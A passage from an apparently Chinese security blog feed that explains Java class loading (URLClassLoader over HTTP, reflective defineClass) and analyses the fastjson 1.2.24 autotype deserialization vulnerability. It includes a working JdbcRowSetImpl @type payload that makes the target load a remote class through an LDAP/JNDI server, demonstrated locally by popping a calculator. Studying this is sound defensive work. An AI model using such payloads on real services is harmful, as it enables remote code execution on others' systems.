URLclassloader，这个类还可以通过url来加载任意类</strong></p><p>首先本地起一个http服务，目录下有准备好的恶意类文件</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517142936788.png" alt="image-20240517142936788"></p><p>编写代码，利用URLClassLoader 通过http来加载执行Calc.class类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, MalformedURLException &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>)&#125;); <span class="hljs-comment">//创建一个URLClassLoader对象，该对象使用URL数组作为参数进行初始化。在这里，URL数组只包含一个URL，即&quot;http://127.0.0.1/&quot;。</span><br>        Class&lt;?&gt; aClass = urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>); <span class="hljs-comment">//使用URLClassLoader的loadClass方法加载名为&quot;Calc&quot;的类。这会从指定的URL加载类的字节码。</span><br>        aClass.newInstance(); <span class="hljs-comment">//通过调用newInstance方法创建&quot;Calc&quot;类的一个新实例。</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功加载了恶意类</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517142959216.png" alt="image-20240517142959216"></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517143025537.png" alt="image-20240517143025537"></p><p>可以看到URLclassLoader可以加载class文件，除了http之外还可以用别的协议，比如file协议，jar协议等等</p><h6 id="通过defineClass反射加载任意类"><a href="#通过defineClass反射加载任意类" class="headerlink" title="通过defineClass反射加载任意类"></a>通过defineClass反射加载任意类</h6><p>前面分析得知，最终加载类的字节码是用的 Classloader.defineClass 方法，这里通过反射来调用 defineClass 方法加载任意类，只需要以字节码的形式传入即可</p><p>编写代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InstantiationException, IllegalAccessException, IOException, NoSuchMethodException, InvocationTargetException &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader(); <span class="hljs-comment">//获取系统类加载器（Application ClassLoader）</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class); <span class="hljs-comment">//使用反射获取ClassLoader类中的defineClass方法，该方法用于定义新的类</span><br>        defineClass.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">//设置defineClass方法为可访问（公有），因为它是ClassLoader类的一个受保护方法</span><br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/Simply/Test/Calc.class&quot;</span>)); <span class="hljs-comment">//读取位于指定路径/home/Simply/Test/Calc.class的字节码文件内容，并将其保存为字节数组</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(classLoader, <span class="hljs-string">&quot;Calc&quot;</span>, bytes, <span class="hljs-number">0</span>, bytes.length); <span class="hljs-comment">//使用defineClass方法将字节码转换为Class对象，并指定类的名称为&quot;Calc&quot;</span><br>        calc.newInstance(); <span class="hljs-comment">//通过调用newInstance方法创建&quot;Calc&quot;类的一个新实例</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517144920390.png" alt="image-20240517144920390"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Java反序列化</tag>
      
      <tag>类加载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson低版本反序列化漏洞浅析</title>
    <link href="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <url>/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="fastjson漏洞"><a href="#fastjson漏洞" class="headerlink" title="fastjson漏洞"></a>fastjson漏洞</h3><h4 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h4><p>Fastjson是阿里巴巴的一个开源项目，在GitHub上开源，使用Apache 2.0协议。它是一个支持Java Object和JSON字符串互相转换的Java库。</p><p>JSON.toJSONString 和 JSON.parseObject&#x2F;JSON.parse 分别实现序列化和反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> JSON.toJSONString(obj);        <span class="hljs-comment">// 序列化  对象转为json</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="hljs-comment">// 反序列化  json转为对象</span><br></code></pre></td></tr></table></figure><h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>fastjson为了读取并判断传入的值是什么类型，增加了autotype机制导致了漏洞产生。</p><p>由于要获取json数据详细类型，每次都需要读取@type，而@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。</p><p>那么<strong>攻击者只要准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口从攻击者控制的web服务器远程加载恶意代码并执行，形成RCE。</strong></p><p>就是说，payload字段中带有@type就可以调用指定类的方法，找一个带lookup方法的类，就可以解析ldap协议远程执行恶意类。</p><h4 id="漏洞演示："><a href="#漏洞演示：" class="headerlink" title="漏洞演示："></a>漏洞演示：</h4><p>创建一个项目</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301091049487.png" class="" title="image-20240301091049487"><p>引入fastjson1.2.24版本的依赖，刷新maven</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301091211987.png" class="" title="image-20240301091211987"><p>新建一个User类，写两个属性，然后生成get、set方法和构造方法</p><p>可以用快捷键alt+insert快速生成方法，这里选择生成getter、setter方法</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301093841413.png" class="" title="image-20240301093841413"><p>属性全选</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301093808305.png" class="" title="image-20240301093808305"><p>再生成一个构造方法</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301102552328.png" class="" title="image-20240301102552328"><p>属性无选择就行</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301102606812.png" class="" title="image-20240301102606812"><p>在每个方法里写一个输出语句，方便观察方法的调用</p><p>完整代码：（输出语句敲sout然后tab补全就可以）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;User的无参构造方法&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再创建一个FastJsonTest类</p><p>先new一个对象，然后通过set方法赋值，通过get方法取值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new一个对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-comment">//调用user的set方法，给对象赋值</span><br>        user.setName(<span class="hljs-string">&quot;cc&quot;</span>);<br>        user.setAge(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">//调用get方法，取值</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> user.getAge();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();<br>        System.out.println(name + <span class="hljs-string">&quot; &quot;</span> + age);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301104006424.png" class="" title="image-20240301104006424"><p>使用fastjson的 <em>JSON</em>.<em>toJSONString</em> 方法来序列化user对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new一个对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-comment">//调用user的set方法，给对象赋值</span><br>        user.setName(<span class="hljs-string">&quot;cc&quot;</span>);<br>        user.setAge(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">//调用get方法，取值</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> user.getAge();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();<br>        System.out.println(name + <span class="hljs-string">&quot; &quot;</span> + age);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//序列化user对象</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user); <span class="hljs-comment">//序列化时，调用了构造方法和get方法。</span><br>        <span class="hljs-comment">//输出序列化后的字符串</span><br>        System.out.println(jsonString);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：这里没有调用构造方法是因为前面调用过，构造方法只会调用一次（在整个对象的生命周期）</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301105058689.png" class="" title="image-20240301105058689"><p>使用fastjson的 <em>JSON</em>.<em>parseObject</em> 方法来反序列化json字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new一个对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-comment">//调用user的set方法，给对象赋值</span><br>        user.setName(<span class="hljs-string">&quot;cc&quot;</span>);<br>        user.setAge(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">//调用get方法，取值</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> user.getAge();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();<br>        System.out.println(name + <span class="hljs-string">&quot; &quot;</span> + age);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//序列化user对象</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user); <span class="hljs-comment">//序列化时，调用了构造方法和get方法。</span><br>        <span class="hljs-comment">//输出序列化后的字符串</span><br>        System.out.println(jsonString);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//反序列化json字符串</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString); <span class="hljs-comment">//反序列化时，会调用构造方法</span><br>        System.out.println(jsonObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：这里没有调用构造方法是因为前面调用过，构造方法只会调用一次（在整个对象的生命周期）</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301111219792.png" class="" title="image-20240301111219792"><p>添加@type字段进行反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new一个对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-comment">//调用user的set方法，给对象赋值</span><br>        user.setName(<span class="hljs-string">&quot;cc&quot;</span>);<br>        user.setAge(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">//调用get方法，取值</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> user.getAge();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();<br>        System.out.println(name + <span class="hljs-string">&quot; &quot;</span> + age);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//序列化user对象</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user); <span class="hljs-comment">//序列化时，调用了构造方法和get方法。</span><br>        <span class="hljs-comment">//输出序列化后的字符串</span><br>        System.out.println(jsonString);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//反序列化json字符串</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString); <span class="hljs-comment">//反序列化时，会调用构造方法</span><br>        System.out.println(jsonObject);<br>        System.out.println();<span class="hljs-comment">//换行</span><br><br>        <span class="hljs-comment">//**反序列化时带有@type参数，会执行类的构造方法和属性相关的get，set方法**，也造成了漏洞的产生</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:23,\&quot;name\&quot;:\&quot;cc\&quot;&#125;&quot;</span>;<br>        JSON.parseObject(payload); <span class="hljs-comment">//有@type参数，set、get、构造方法都有调用！</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301112134212.png" class="" title="image-20240301112134212"><p>更换payload，借助jdbcRowSetImpl类让目标访问远程ldap服务器，执行恶意类</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title class_">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;<span class="hljs-char escape_">\&quot;</span>@type<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-char escape_">\&quot;</span>,<span class="hljs-char escape_">\&quot;</span>dataSourceName<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>ldap://localhost:1389/Exploit<span class="hljs-char escape_">\&quot;</span>,&quot;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&quot; <span class="hljs-char escape_">\&quot;</span>autoCommit<span class="hljs-char escape_">\&quot;</span>:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>用工具生成一个jndi服务，执行计算器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301112904972.png" class="" title="image-20240301112904972"><p>更换payload1中ldap的地址和路径，进行反序列化操作，成功弹出计算器</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301113035437.png" class="" title="image-20240301113035437"><h4 id="利用链分析："><a href="#利用链分析：" class="headerlink" title="利用链分析："></a>利用链分析：</h4><p>payload是通过 jdbcRowSetImpl 类来实现的，查找 jdbcRowSetImpl 类的位置，直接ctrl+左键就可以调到这个类的位置</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301141234438.png" class="" title="image-20240301141234438"><p>跳过来后点这个按钮即可定位类的路径</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301141416747.png" class="" title="image-20240301141416747"><p><strong>由前面的演示得知，反序列化时带有@type参数，会执行指定类的构造方法和属性相关的get，set方法</strong></p><h6 id="查找-dataSourceName-的get和set方法："><a href="#查找-dataSourceName-的get和set方法：" class="headerlink" title="查找 dataSourceName 的get和set方法："></a>查找 dataSourceName 的get和set方法：</h6><p><em>getDataSourceName</em> 方法就是返回dataSource值</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305094647956.png" class="" title="image-20240305094647956"><p><em>setDataSourceName</em> 方法是传递一个字符串值var1，具体操作如下：</p><ol><li>通过 <code>this.getDataSourceName()</code> 方法获取当前数据源的名称，然后检查是否为 null。如果当前数据源名称不为 null，则进入下一步判断。</li><li>在当前数据源名称不为 null 的情况下，再次通过 <code>this.getDataSourceName()</code> 方法获取当前数据源名称，并与传入的参数 <code>var1</code> 进行比较。如果两者不相等，则执行以下操作。</li><li>调用父类的 <code>setDataSourceName</code> 方法，将参数 <code>var1</code> 设置为新的数据源名称。</li><li>将类中的 <code>conn</code>（连接对象）置为 null，表示需要重新建立连接。</li><li>将类中的 <code>ps</code>（预编译语句对象）置为 null，表示需要重新创建预编译语句对象。</li><li>将类中的 <code>rs</code>（结果集对象）置为 null，表示需要重新创建结果集对象。</li></ol><p>简单来说就是将参数var1赋值给dataSource，payload中就是将恶意地址<code>ldap://localhost:1389/Exploit</code>赋值给了dataSource</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305094733791.png" class="" title="image-20240305094733791"><h6 id="查找-autoCommit-的get和set方法："><a href="#查找-autoCommit-的get和set方法：" class="headerlink" title="查找 autoCommit 的get和set方法："></a>查找 autoCommit 的get和set方法：</h6><p><em>getAutoCommit</em> 方法就是返回一个布尔值</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305095559183.png" class="" title="image-20240305095559183"><p><em>setAutoCommit</em> 方法中 this.conn 是否为空，为空就调用 <em>connect</em> 方法</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240305095627410.png" class="" title="image-20240305095627410"><h6 id="查看-connect-方法："><a href="#查看-connect-方法：" class="headerlink" title="查看 connect 方法："></a>查看 